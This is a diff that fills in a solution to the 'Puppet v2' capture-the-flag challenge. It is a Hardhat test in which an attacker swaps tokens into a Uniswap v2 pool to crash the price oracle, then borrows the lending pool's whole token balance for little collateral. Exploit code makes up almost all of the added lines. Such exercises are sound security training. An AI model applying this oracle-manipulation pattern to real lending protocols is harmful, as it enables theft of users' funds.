@@ -4,6 +4,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { providers } = require("@ethereum-waffle/provider/node_modules/ethers");
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, attacker;
@@ -82,6 +83,35 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // approve the uniswap router for swap
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        
+        // swap to change the pool dynamic
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            0, 
+            [this.token.address, this.weth.address],
+            attacker.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
+        );
+
+        // calculate amount of WETH needed to deposit for getting all of the token in the pool
+        let collateralInETH = await this.lendingPool.connect(attacker).calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        
+        // get balance of ETH after the swap and compare if there's enough ETH to get all of the token in the pool
+        let etherBal = await ethers.provider.getBalance(attacker.address);
+        etherBal > collateralInETH ? NaN : console.log("Not enough ETH to meet deposit of WETH required")
+        
+        // wrap the ETH
+        await this.weth.connect(attacker).deposit({value: collateralInETH});
+        
+        // approve the lending pool
+        await this.weth.connect(attacker).approve(this.lendingPool.address, collateralInETH);
+
+        // get all of the token in the poool
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE); 
+
     });
 
     after(async function () {
